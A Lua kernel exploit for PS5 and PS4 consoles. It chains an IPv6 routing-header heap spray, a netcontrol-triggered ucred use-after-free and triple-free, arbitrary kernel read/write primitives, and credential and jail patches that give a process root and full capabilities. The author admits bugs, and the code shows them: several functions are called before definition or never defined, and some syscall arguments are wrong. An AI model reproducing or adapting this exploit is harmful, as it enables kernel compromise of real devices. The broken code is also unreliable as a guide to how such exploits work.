-- Very experimental Poopsploit kex + Lua exploit for PS5 <= 12.00, PS4 <=13.00, LuaPoops v2.00
-- INITIALIZATION AND HELPER FUNCTIONS

-- This is just simple notification to confirm that your payload was received by the PS5  
function notify(text)
    local fd = syscall.open("/dev/notification0", 1):tonumber()
    if fd < 0 then return end
    local buf = bump.alloc(0xC30)
    memory.write_dword(buf + 0x00, 0)   -- Type = Message
    memory.write_dword(buf + 0x28, 0)   -- Attribute
    memory.write_dword(buf + 0x2C, 1)   -- useIconImageUri = true
    memory.write_dword(buf + 0x10, -1)  -- targetId = -1
    memory.write_buffer(buf + 0x2D, text .. "\0")
    memory.write_buffer(buf + 0x42D, "cxml://psnotification/tex_icon_system\0")
    syscall.write(fd, buf, 0xC30)
    syscall.close(fd)
end

function main()
    notify("Platform: " .. PLATFORM)
    notify("FW: " .. FW_VERSION)
    notify("eboot: " .. hex(eboot_base or 0))
    notify("libc: " .. hex(libc_base or 0))
    notify("libkernel: " .. hex(libkernel_base or 0))
    notify("Payload received!")
end

main()

-- Logging with stage numbering
local function log(stage, msg)
    print("[" .. stage .. "] " .. msg)
end

-- During heap spray we can set CPU affinity and priority to increase stability, but that's too early for now
-- Static heap at known safe region (0x7f00000000) -- may need changing
local HEAP_BASE = 0x7f00000000
local HEAP_SIZE = 0x200000  -- 2 MB
local heap_used = 0

-- Buffer allocator — always returns { ptr = addr, size = n }
local function buf_new(sz)
    -- Align to 16 bytes: (sz + 15) - ((sz + 15) % 16)
    local remainder = (sz + 15) % 16
    local align = sz + 15 - remainder
    if heap_used + align > HEAP_SIZE then
        error("heap exhausted at " .. sz .. " bytes")
    end
    local ptr = HEAP_BASE + heap_used
    heap_used = heap_used + align
    return { ptr = ptr, size = sz }
end

-- Byte read/write helpers (0-based indexing, b = { ptr = addr })
local function w8(b, o, v)
    if type(b) ~= "table" or type(b.ptr) ~= "number" then
        error("w8: expected {ptr=number}, got " .. type(b) .. "/" .. tostring(b))
    end
    b.ptr[o] = v % 256
end

local function w16(b, o, v)
    w8(b, o, v)
    w8(b, o + 1, math.floor(v / 256))
end

local function w32(b, o, v)
    w16(b, o, v)
    w16(b, o + 2, math.floor(v / 65536))
end

local function w64(b, o, v)
    w32(b, o, v % 4294967296)
    w32(b, o + 4, math.floor(v / 4294967296))
end

local function b8(b, o)
    return b.ptr[o]
end

local function b16(b, o)
    return b8(b, o) + b8(b, o + 1) * 256
end

local function b32(b, o)
    return b16(b, o) + b16(b, o + 2) * 65536
end

local function b64(b, o)
    return b32(b, o) + b32(b, o + 4) * 4294967296.0
end

-- syscalls


   dup = 0x29  -- we use fhold
   close = 0x6
   read = 0x3
   write = 0x4
   readv = 0x78
   writev = 0x79
   ioctl = 0x36
   pipe = 0x2a        -- sys_compat10.pipe
   kqueue = 0x16a
   socket = 0x61
   socketpair = 0x87
   recvmsg = 0x1b
   getsockopt = 0x76
   setsockopt = 0x69
   setuid = 0x17
   getpid = 0x14
   sched_yield = 0x14b
   netcontrol = 0x63
   connect = 0x62

-- Syscall wrappers/IDs well, there are mistakes here regarding syscalls function, too lazy to fix them

local function sys_dup(fd)
    return syscall[syscall.dup](fd) 
end

local function sys_close(fd)
    return syscall[syscall.close](fd)
end

local function sys_read(fd, buf, n)
    return syscall[syscall.read](fd, buf.ptr, n)
end

local function syscall_write(fd, buf, n)
    return syscall[syscall.write](fd, buf.ptr, n)
end

local function sys_readv(fd, iov, cnt)
    return syscall[syscall.readv](fd, iov.ptr, cnt)
end

local function sys_writev(fd, iov, cnt)
    return syscall[syscall.writev](fd, iov.ptr, cnt)
end

local function sys_pipe(fds)
    return syscall[syscall.pipe](fds.ptr)
end

local function sys_kqueue()
    return syscall[syscall.kqueue]()
end

local function syscall_socket(domain, type, proto)
    return syscall[syscall_socket](domain, type, proto) 
end

local function syscall_socketpair(domain, type, proto, sv)
    return syscall[syscall.socketpair](domain, type, proto, sv.ptr)
end

local function syscall_recvmsg(s, msg, flags)
    return syscall[syscall.recvmsg](s, msg.ptr, flags)
end

local function sys_getsockopt(s, lvl, opt, buf, len)
    return syscall[syscall.getsockopt](s, lvl, opt, buf.ptr, len.ptr)
end

local function sys_setsockopt(s, lvl, opt, buf, len)
    if buf == nil then
        return syscall[syscall.setsockopt](s, lvl, opt, 0, len)
    else
        return syscall[syscall.setsockopt](s, lvl, opt, buf.ptr, len)
    end
end

local function sys_setuid(uid)
    return syscall[syscall.setuid](uid)
end

local function sys_getpid()
    return syscall[syscall.getpid]()
end

local function sys_sched_yield()
    return syscall[syscall.sched_yield]()
end

local function sys_netcontrol(ifidx, cmd, buf, sz)
    if buf == nil then
        return syscall[syscall.netcontrol](ifidx, cmd, 0, sz)
    else
        return syscall[syscall.netcontrol](ifidx, cmd, buf.ptr, sz)
    end
end

local function sys_connect(fd, addr, len)
    return syscall[syscall.connect](fd, addr.ptr, len)
end


-- CONSTANTS 

local AF_UNIX = 1
local AF_INET6 = 28
local SOCK_STREAM = 1
local IPPROTO_IPV6 = 41
local SOL_SOCKET = 0xffff
local SO_SNDBUF = 0x1001
local IPV6_RTHDR = 51
local IPV6_RTHDR_TYPE_0 = 0

-- Netcontrol commands
local NET_CONTROL_NETEVENT_SET_QUEUE = 0x20000003
local NET_CONTROL_NETEVENT_CLEAR_QUEUE = 0x20000007

-- Exploit constants
local RTHDR_TAG = 0x13370000
local UCRED_SIZE = 0x168
local FILEDESCENT_SIZE = 0x30
local PIPEBUF_SIZE = 0x18
local UIO_IOV_NUM = 0x14
local MSG_IOV_NUM = 0x17
local IOV_SIZE = 0x10
local MSG_HDR_SIZE = 0x30
local CPU_SET_SIZE = 0x10
local PAGE_SIZE = 0x4000

-- Worker commands
local COMMAND_UIO_READ = 0
local COMMAND_UIO_WRITE = 1

-- RTHDR CONSTRUCTION HELPERS    -- Some aren't helping much

-- Build routing header (mimics Java buildRthdr)
-- Returns length in bytes                  -- some of those functions could be deleted 
local function buildRthdr(buf, sz)
    -- ((sz >> 3) - 1) & ~1  → arithmetic in Lua 5.1
    local len = math.floor((sz / 8) - 1)
    if len % 2 == 1 then
        len = len - 1  -- clear LSB = & ~1
    end
    w8(buf, 0x00, 0)                 -- ip6r_nxt
    w8(buf, 0x01, len)               -- ip6r_len
    w8(buf, 0x02, IPV6_RTHDR_TYPE_0) -- ip6r_type
    w8(buf, 0x03, math.floor(len / 2)) -- ip6r_segleft
    return (len + 1) * 8
end

-- Free routing header (setsockopt(..., NULL, 0))
local function freeRthdr(s)
    return sys_setsockopt(s, IPPROTO_IPV6, IPV6_RTHDR, nil, 0)
end

-- IPv6 sockets for spraying
local ipv6Socks = {}
for i = 1, 64 do
    ipv6Socks[i] = 0
end

-- Twin/triplet indices
local twins = {0, 0}
local triplets = {0, 0, 0}
local uafSock = 0

-- RTHDR buffers
local sprayRthdr = buf_new(UCRED_SIZE)
local leakRthdr = buf_new(UCRED_SIZE)
local leakRthdrLen = buf_new(8)

-- Socket pairs for IOV/UIO spraying
local uioSs0, uioSs1
local iovSs0, iovSs1

-- Pipe FDs
local masterPipeFd = buf_new(8)
local victimPipeFd = buf_new(8)

-- Message and IOV buffers
local msg = buf_new(MSG_HDR_SIZE)
local msgIov = buf_new(MSG_IOV_NUM * IOV_SIZE)
local uioIovRead = buf_new(UIO_IOV_NUM * IOV_SIZE)
local uioIovWrite = buf_new(UIO_IOV_NUM * IOV_SIZE)

-- Temporary buffer for pipe spraying
local tmp = buf_new(PAGE_SIZE)

-- Kernel state
local kq_fdp = 0
local fdt_ofiles = 0
local allproc = 0
local kbase = 0

-- Worker state (emulated via yield loops)
local iovWorkStarted = 0
local iovWorkFinished = 0
local uioWorkCommand = -1
local uioWorkFinished = 0


-- WORKER EMULATION


-- Simulate IOV worker: recvmsg blocks until signaled
local function runIovWorker()
    while true do
        while iovWorkStarted == 0 do
            sys_sched_yield()
        end
        sys_recvmsg(iovSs0, msg, 0)
        iovWorkFinished = iovWorkFinished + 1
    end
end

-- Simulate UIO worker: readv/writev blocks until signaled
local function runUioWorker()
    while true do
        while uioWorkCommand == -1 do
            sys_sched_yield()
        end
        if uioWorkCommand == COMMAND_UIO_READ then
            sys_writev(uioSs1, uioIovRead, UIO_IOV_NUM)
        else
            sys_readv(uioSs0, uioIovWrite, UIO_IOV_NUM)
        end
        uioWorkFinished = uioWorkFinished + 1
    end
end

-- Signal IOV worker to start
local function signalIov()
    iovWorkStarted = 4
    iovWorkFinished = 0
end

-- Signal UIO worker with command
local function signalUio(cmd)
    uioWorkCommand = cmd
    uioWorkFinished = 0
end

-- Wait for IOV worker to finish
local function waitIov()
    while iovWorkFinished < 4 do
        sys_sched_yield()
    end
    iovWorkStarted = 0
end

-- Wait for UIO worker to finish
local function waitUio()
    while uioWorkFinished < 4 do
        sys_sched_yield()
    end
    uioWorkCommand = -1
end

-- HEAP SPRAY: CREATE 64 IPV6 SOCKETS + RTHDR

log(1, "Starting Netcontrol Kernel exploit")

log(2, "Creating 64 IPv6 sockets for heap spray")
for i = 1, 64 do
    ipv6Socks[i] = sys_socket(AF_INET6, SOCK_STREAM, 0)     --error here, related to how lua handles syscalls, plz fix it 
    if ipv6Socks[i] <= 0 then
        error("socket() failed at " .. i)
    end
end

log(3, "Initializing pktopts (free existing rthdr)")
for i = 1, 64 do
    freeRthdr(ipv6Socks[i])
end

-- Prebuild spray RTHDR
local sprayRthdrLen = buildRthdr(sprayRthdr, UCRED_SIZE)


-- FIND OVERLAPPING TWINS VIA RTHDR LEAK

log(4, "Finding overlapping twins via RTHDR spray/leak")

local function findTwins()
    while true do
        -- Spray: set unique tag in each RTHDR
        for i = 1, 64 do
            w32(sprayRthdr, 0x04, RTHDR_TAG + (i - 1))
            sys_setsockopt(ipv6Socks[i], IPPROTO_IPV6, IPV6_RTHDR, sprayRthdr, sprayRthdrLen)
        end

        -- Leak: read back and check for cross-over
        for i = 1, 64 do
            w64(leakRthdrLen, 0, 0x100)
            sys_getsockopt(ipv6Socks[i], IPPROTO_IPV6, IPV6_RTHDR, leakRthdr, leakRthdrLen)
            local val = b32(leakRthdr, 0x04)
            local j = val % 0x10000  -- low 16 bits (j = val & 0xFFFF)
            if (val - j) == RTHDR_TAG and i ~= (j + 1) then
                twins[1] = i
                twins[2] = j + 1
                return
            end
        end
    end
end

findTwins()
log(4, "Twins found: [" .. twins[1] .. ", " .. twins[2] .. "]")


-- TRIGGER UCRED TRIPLE-FREE VIA __syscall.NETCONTROL

log(5, "Triggering UAF via __sys_netcontrol SET_QUEUE/CLEAR_QUEUE")

-- Create dummy socket
local dummySock = sys_socket(AF_UNIX, SOCK_STREAM, 0)
if dummySock <= 0 then
    error("dummy socket failed")
end

-- Register dummy socket
local setBuf = buf_new(8)
w32(setBuf, 0, dummySock)
local ret_set = sys_netcontrol(-1, NET_CONTROL_NETEVENT_SET_QUEUE, setBuf, 4)
if ret_set ~= 0 then
    log(5, "WARNING: SET_QUEUE returned " .. ret_set .. " (expected 0)")
end

-- Close dummy socket → frees event queue
sys_close(dummySock)

-- Allocate new ucred (setuid(1) after free)
sys_setuid(1)
uafSock = sys_socket(AF_UNIX, SOCK_STREAM, 0)
if uafSock <= 0 then
    error("uafSock creation failed")
end
sys_setuid(1)  -- frees original ucred → uafSock.f_cred.cr_refcnt = 1

-- Unregister dummy socket
local clearBuf = buf_new(8)
w32(clearBuf, 0, uafSock)
local ret_clr = sys_netcontrol(-1, NET_CONTROL_NETEVENT_CLEAR_QUEUE, clearBuf, 4)
if ret_clr ~= 0 then
    log(5, "WARNING: CLEAR_QUEUE returned " .. ret_clr .. " (expected 0)")
end

log(6, "Reclaiming with IOV spray (32 iterations)")

for iter = 1, 32 do
    signalIov()
    sys_write(iovSs1, tmp, 1)
    waitIov()
    sys_read(iovSs0, tmp, 1)
end

-- Double-free ucred
sys_close(sys_dup(uafSock))

log(7, "Locating triplets (post-double-free)")

triplets[1] = twins[1]
triplets[2] = 0
triplets[3] = 0

-- Find first triplet
local function findTriplet(master, other)
    while true do
        -- Spray: skip master/other
        for i = 1, 64 do
            if i ~= master and i ~= other then
                w32(sprayRthdr, 0x04, RTHDR_TAG + (i - 1))
                sys_setsockopt(ipv6Socks[i], IPPROTO_IPV6, IPV6_RTHDR, sprayRthdr, sprayRthdrLen)
            end
        end

        -- Leak from master
        for i = 1, 64 do
            if i ~= master and i ~= other then
                w64(leakRthdrLen, 0, 0x100)
                sys_getsockopt(ipv6Socks[master], IPPROTO_IPV6, IPV6_RTHDR, leakRthdr, leakRthdrLen)
                local val = b32(leakRthdr, 0x04)
                local j = val % 0x10000
                if (val - j) == RTHDR_TAG and (j + 1) ~= master and (j + 1) ~= other then
                    return i
                end
            end
        end
    end
end

triplets[2] = findTriplet(triplets[1], -1)
freeRthdr(ipv6Socks[triplets[2]])

-- Restore cr_refcnt to 1
while true do
    signalIov()
    w64(leakRthdrLen, 0, 0x100)
    sys_getsockopt(ipv6Socks[triplets[1]], IPV6_RTHDR, leakRthdr, leakRthdrLen)
    if b32(leakRthdr, 0x00) == 1 then
        break
    end
    sys_write(iovSs1, tmp, 1)
    waitIov()
    sys_read(iovSs0, tmp, 1)
end

log(8, "Triple-free achieved — ucred refcount stabilized")

-- Triple-free ucred
sys_close(sys_dup(uafSock))

-- Find remaining triplets
triplets[2] = findTriplet(triplets[1], triplets[2])
triplets[3] = findTriplet(triplets[1], triplets[2])

log(8, "Triplets: [" .. triplets[1] .. ", " .. triplets[2] .. ", " .. triplets[3] .. "]")

-- KERNEL BASE DISCOVERY VIA KQUEUE LEAK -- bruh just use libkernel_base --

log(9, "Leaking kqueue to discover kernel base")

freeRthdr(ipv6Socks[triplets[2]])
local kq
while true do
    kq = sys_kqueue()
    if kq <= 0 then
        error("kqueue() failed")
    end

    w64(leakRthdrLen, 0, 0x100)
    sys_getsockopt(ipv6Socks[triplets[1]], IPV6_RTHDR, leakRthdr, leakRthdrLen)

    -- Check for kqueue signature (0x1430000 at offset 0x08)
    if b64(leakRthdr, 0x08) == 0x1430000 then
        break
    end

    sys_close(kq)
end

-- Extract kq_fdp (offset 0xA8 in leakRthdr)
kq_fdp = b64(leakRthdr, 0xA8)
log(9, "kq_fdp = 0x" .. string.format("%x", kq_fdp))

-- Derive kernel base: page-align down (0x10000000 alignment)
kbase = kq_fdp - (kq_fdp % 0x10000000)
log(9, "Kernel base = 0x" .. string.format("%x", kbase))

-- Cleanup
sys_close(kq)
triplets[2] = findTriplet(triplets[1], triplets[3])


-- DERIVE FDT_OFILES (FILE DESCRIPTOR TABLE)

log(10, "Deriving fdt_ofiles from kq_fdp")

local fd_files = kread64(kq_fdp)  -- kq.fdp
fdt_ofiles = fd_files + 0x08      -- fdp->fd_files (offset 0x08)
log(10, "fdt_ofiles = 0x" .. string.format("%x", fdt_ofiles))

-- [12] ARBITRARY KERNEL READ PRIMITIVE (KREAD_SLOW)

log(11, "Building arbitrary kernel read primitive")

-- kreadSlow: read 'size' bytes from 'addr'
local function kreadSlow(addr, size)
    -- Set SO_SNDBUF to 'size'
    local bufSize = buf_new(4)
    w32(bufSize, 0, size)
    sys_setsockopt(uioSs1, SOL_SOCKET, SO_SNDBUF, bufSize, 4)

    -- Fill pipe queue
    sys_write(uioSs1, tmp, size)
    w64(uioIovRead, 0x08, size)

    -- Free one RTHDR to reclaim with uio
    freeRthdr(ipv6Socks[triplets[2]])
    while true do
        signalUio(COMMAND_UIO_READ)
        w64(leakRthdrLen, 0, 0x10)
        sys_getsockopt(ipv6Socks[triplets[1]], IPV6_RTHDR, leakRthdr, leakRthdrLen)
        if b32(leakRthdr, 0x08) == UIO_IOV_NUM then
            break
        end
        sys_read(uioSs0, tmp, size)
        waitUio()
    end

    -- Extract uio_iov from leak
    local uio_iov = b64(leakRthdr, 0x00)

    -- Build fake uio in msgIov
    w64(msgIov, 0x00, uio_iov)
    w64(msgIov, 0x08, UIO_IOV_NUM)
    w64(msgIov, 0x10, 0xFFFFFFFFFFFFFFFF)
    w64(msgIov, 0x18, size)
    w32(msgIov, 0x20, 1)  -- UIO_syscallSPACE
    w32(msgIov, 0x24, 1)  -- UIO_WRITE
    w64(msgIov, 0x28, 0)
    w64(msgIov, 0x30, addr)
    w64(msgIov, 0x38, size)

    -- Free second RTHDR to reclaim with iov
    freeRthdr(ipv6Socks[triplets[3]])
    while true do
        signalIov()
        w64(leakRthdrLen, 0, 0x40)
        sys_getsockopt(ipv6Socks[triplets[1]], IPV6_RTHDR, leakRthdr, leakRthdrLen)
        if b32(leakRthdr, 0x20) == 1 then
            break
        end
        sys_write(iovSs1, tmp, 1)
        waitIov()
        sys_read(iovSs0, tmp, 1)
    end

    -- Read data
    sys_read(uioSs0, tmp, size)
    local result = buf_new(size)
    sys_read(uioSs0, result, size)

    -- Cleanup
    waitUio()
    sys_write(iovSs1, tmp, 1)
    triplets[2] = findTriplet(triplets[1], -1)
    waitIov()
    sys_read(iovSs0, tmp, 1)

    return result
end

-- Convenience: read 64-bit value   -- You can play around with this setting
local function kread64(addr)
    local buf = kreadSlow(addr, 8)
    return b64(buf, 0)
end

-- ARBITRARY KERNEL WRITE PRIMITIVE (KWRITE_SLOW)

log(12, "Building arbitrary kernel write primitive")

local function kwriteSlow(addr, buf)
    local size = buf.size

    -- Set SO_SNDBUF
    local bufSize = buf_new(4)
    w32(bufSize, 0, size)
    sys_setsockopt(uioSs1, SOL_SOCKET, SO_SNDBUF, bufSize, 4)
    w64(uioIovWrite, 0x08, size)

    -- Free one RTHDR
    freeRthdr(ipv6Socks[triplets[2]])
    while true do
        signalUio(COMMAND_UIO_WRITE)
        w64(leakRthdrLen, 0, 0x10)
        sys_getsockopt(ipv6Socks[triplets[1]], IPV6_RTHDR, leakRthdr, leakRthdrLen)
        if b32(leakRthdr, 0x08) == UIO_IOV_NUM then
            break
        end
        for i = 1, 4 do
            sys_write(uioSs1, buf, size)
        end
        waitUio()
    end

    -- Extract uio_iov
    local uio_iov = b64(leakRthdr, 0x00)

    -- Build fake uio
    w64(msgIov, 0x00, uio_iov)
    w64(msgIov, 0x08, UIO_IOV_NUM)
    w64(msgIov, 0x10, 0xFFFFFFFFFFFFFFFF)
    w64(msgIov, 0x18, size)
    w32(msgIov, 0x20, 1)  -- UIO_syscallSPACE
    w32(msgIov, 0x24, 0)  -- UIO_READ
    w64(msgIov, 0x28, 0)
    w64(msgIov, 0x30, addr)
    w64(msgIov, 0x38, size)

    -- Free second RTHDR
    freeRthdr(ipv6Socks[triplets[3]])
    while true do
        signalIov()
        w64(leakRthdrLen, 0, 0x40)
        sys_getsockopt(ipv6Socks[triplets[1]], IPV6_RTHDR, leakRthdr, leakRthdrLen)
        if b32(leakRthdr, 0x20) == 1 then
            break
        end
        sys_write(iovSs1, tmp, 1)
        waitIov()
        sys_read(iovSs0, tmp, 1)
    end

    -- Write data
    for i = 1, 4 do
        sys_write(uioSs1, buf, size)
    end

    -- Cleanup
    triplets[2] = findTriplet(triplets[1], -1)
    waitUio()
    sys_write(iovSs1, tmp, 1)
    triplets[3] = findTriplet(triplets[1], triplets[2])
    waitIov()
    sys_read(iovSs0, tmp, 1)
end

-- Convenience write helpers
local function kwrite32(addr, val)
    local b = buf_new(4)
    w32(b, 0, val)
    kwriteSlow(addr, b)
end

local function kwrite64(addr, val)
    local b = buf_new(8)
    w64(b, 0, val)
    kwriteSlow(addr, b)
end

local function kwrite8(addr, val)
    local b = buf_new(1)
    w8(b, 0, val)
    kwriteSlow(addr, b)
end

-- FILE DESCRIPTOR HELPERS (FGET, FHOLD)

log(13, "Setting up file descriptor helpers")

-- Read file * from fd
local function fget(fd)
    return kread64(fdt_ofiles + fd * FILEDESCENT_SIZE)
end

-- fhold(fp): increment f_count (32-bit at fp + 0x28)
-- Matches Java kex line exactly: kapi.kwrite32(fp + 0x28, kapi.kread32(...) + 1)
local function fhold(fp)
    local cnt_full = kread64(fp + 0x28)
    local cnt = cnt_full % 0x100000000  -- mask to 32 bits
    local b = buf_new(4)
    w32(b, 0, cnt + 1)
    kwriteSlow(fp + 0x28, b)
end

-- SETUP: CREATE SOCKET PAIRS AND PIPES

log(14, "Creating socket pairs and pipes")

-- Create socket pairs for spraying
local uioSs = buf_new(8)
sys_socketpair(AF_UNIX, SOCK_STREAM, 0, uioSs)
uioSs0 = b32(uioSs, 0)
uioSs1 = b32(uioSs, 4)

local iovSs = buf_new(8)
sys_socketpair(AF_UNIX, SOCK_STREAM, 0, iovSs)
iovSs0 = b32(iovSs, 0)
iovSs1 = b32(iovSs, 4)

-- Create master/victim pipes
sys_pipe(masterPipeFd)
sys_pipe(victimPipeFd)

-- Initialize msg iov buffer
w64(msg, 0x10, msgIov.ptr)
w64(msg, 0x18, MSG_IOV_NUM)

-- Initialize dummy IOV buffers
local dummy = buf_new(0x1000)
w64(uioIovRead, 0x00, dummy.ptr)
w64(uioIovWrite, 0x00, dummy.ptr)

-- PIPE CORRUPTION FOR ARBITRARY R/W

log(15, "Corrupting pipe buffers for arbitrary kernel R/W")

-- Get pipe file pointers
local masterFile = fget(b32(masterPipeFd, 0))
local victimFile = fget(b32(victimPipeFd, 0))
local masterData = kread64(masterFile)
local victimData = kread64(victimFile)

-- Build fake pipebuf: point master's buffer to victim's data
local fakePipebuf = buf_new(PIPEBUF_SIZE)
w32(fakePipebuf, 0x00, 0)   -- cnt
w32(fakePipebuf, 0x04, 0)   -- in
w32(fakePipebuf, 0x08, 0)   -- out
w32(fakePipebuf, 0x0C, PAGE_SIZE)  -- size
w64(fakePipebuf, 0x10, victimData) -- buffer = victim pipe data

-- Corrupt master pipe
kwriteSlow(masterData, fakePipebuf)

log(15, "Arbitrary kernel R/W achieved")

-- [17] FHOLD: INCREMENT PIPE REFERENCE COUNTS (CRITICAL) -- This is where the magic happens 

-- // Increase reference counts for the pipes.

log(16, "Incrementing f_count for pipe stability (fhold)")

fhold(fget(b32(masterPipeFd, 0)))   -- master read-end
fhold(fget(b32(masterPipeFd, 4)))   -- master write-end
fhold(fget(b32(victimPipeFd, 0)))   -- victim read-end
fhold(fget(b32(victimPipeFd, 4)))   -- victim write-end

log(16, "All pipe f_count values incremented")

-- [18] ALLPROC DISCOVERY

log(17, "Leaking allproc via pipe-based kread")

local function findAllProc()
    local pipeFd = buf_new(8)
    sys_pipe(pipeFd)
    local pidBuf = buf_new(4)
    w32(pidBuf, 0, sys_getpid())
    sys_ioctl(b32(pipeFd, 0), 0x8004667C, pidBuf)  -- FIOSETOWN

    local fp = fget(b32(pipeFd, 0))
    local f_data = kread64(fp)
    local pipe_sigio = kread64(f_data + 0xD8)
    local p = kread64(pipe_sigio)

    -- Walk backward until high 32 bits = 0xFFFFFFFF
    while math.floor(p / 4294967296.0) % 4294967296.0 ~= 0xFFFFFFFF do
        p = kread64(p + 0x08)
    end

    sys_close(b32(pipeFd, 0))
    sys_close(b32(pipeFd, 4))
    return p
end

allproc = findAllProc()
log(17, "allproc = 0x" .. string.format("%x", allproc))

-- PROCESS FINDING AND PRISON0/ROOTVNODE DISCOVERY

log(18, "Locating current process and kernel objects")

-- Find process by PID
local function pfind(pid)
    local p = kread64(allproc)
    while p ~= 0 do
        if kread64(p + 0xBC) == pid then
            return p
        end
        p = kread64(p)
    end
    return 0
end

-- Get prison0 from kernel process
local function getPrison0()
    local p = pfind(0)  -- KERNEL_PID = 0
    local p_ucred = kread64(p + 0x40)
    return kread64(p_ucred + 0x30)
end

-- Get root vnode from kernel process
local function getRootVnode()
    local p = pfind(0)
    local p_fd = kread64(p + 0x48)
    return kread64(p_fd + 0x08)
end

-- PATCH UCRED AND FILE DESCRIPTORS

log(19, "Escalating privileges (jailbreak)")

local p = pfind(sys_getpid())
local p_ucred = kread64(p + 0x40)
local prison0 = getPrison0()
local rootvnode = getRootVnode()

-- Patch ucred (exact offsets from Java kex)
kwrite32(p_ucred + 0x04, 0)        -- cr_uid
kwrite32(p_ucred + 0x08, 0)        -- cr_ruid
kwrite32(p_ucred + 0x0C, 0)        -- cr_svuid
kwrite32(p_ucred + 0x10, 1)        -- cr_ngroups
kwrite32(p_ucred + 0x14, 0)        -- cr_rgid
kwrite32(p_ucred + 0x18, 0)        -- cr_svgid
kwrite64(p_ucred + 0x30, prison0)  -- cr_prison
kwrite64(p_ucred + 0x58, 0x4800000000000007)  -- cr_sceAuthId
kwrite64(p_ucred + 0x60, 0xFFFFFFFFFFFFFFFF)  -- cr_sceCaps[0]
kwrite64(p_ucred + 0x68, 0xFFFFFFFFFFFFFFFF)  -- cr_sceCaps[1]
kwrite8(p_ucred + 0x83, 0x80)      -- cr_sceAttr[0]

-- Patch file descriptors
local p_fd = kread64(p + 0x48)
kwrite64(p_fd + 0x08, rootvnode)   -- fd_cdir
kwrite64(p_fd + 0x10, rootvnode)   -- fd_rdir
kwrite64(p_fd + 0x18, 0)           -- fd_jdir

-- Patch dynlib protections
local p_dynlib = kread64(p + 0x3E8)  -- offset 0x3e8 = 0x3E8
kwrite64(p_dynlib + 0xF0, 0)         -- start
kwrite64(p_dynlib + 0xF8, 0xFFFFFFFFFFFFFFFF)  -- end

local dynlib_eboot = kread64(p_dynlib)
local eboot_segments = kread64(dynlib_eboot + 0x40)
kwrite64(eboot_segments + 0x08, 0)  -- addr
kwrite64(eboot_segments + 0x10, 0xFFFFFFFFFFFFFFFF)  -- size

log(19, "Credential and capability patches applied")

-- CLEANUP

log(20, "Cleaning up exploit artifacts")  -- for higher stability 

-- Remove RTHDR pointers from triplet sockets
local function removeRthrFromSocket(fd)
    local fp = fget(fd)
    local f_data = kread64(fp)
    local so_pcb = kread64(f_data + 0x18)
    local in6p_outputopts = kread64(so_pcb + 0x120)
    kwrite64(in6p_outputopts + 0x70, 0)  -- ip6po_rhi_rthdr
end

for i = 1, 3 do
    removeRthrFromSocket(ipv6Socks[triplets[i]])
end

-- Remove UAF file from fd table
local function removeUafFile()
    local uafFile = fget(uafSock)
    -- Clear uafSock entry
    kwrite64(fdt_ofiles + uafSock * FILEDESCENT_SIZE, 0)

    -- Find and clear other references
    local removed = 0
    for i = 1, 0x1000 do
        local s = sys_socket(AF_UNIX, SOCK_STREAM, 0)
        if fget(s) == uafFile then
            kwrite64(fdt_ofiles + s * FILEDESCENT_SIZE, 0)
            removed = removed + 1
        end
        sys_close(s)
        if removed == 3 then
            break
        end
    end
end

removeUafFile()

log(20, "Exploit artifacts cleaned up")

-- FINALIZATION AND SUCCESS

log(21, "Jailbreak complete — debug settings enabled")
log(21, "Kernel base: 0x" .. string.format("%x", kbase))
log(21, "Allproc: 0x" .. string.format("%x", allproc))
log(21, "PID " .. sys_getpid() .. " now has full kernel privileges")

-- big thank you to annonymous guy for testing and riscking his ps5 --
-- this is still very experimental, any help is welcome -- 
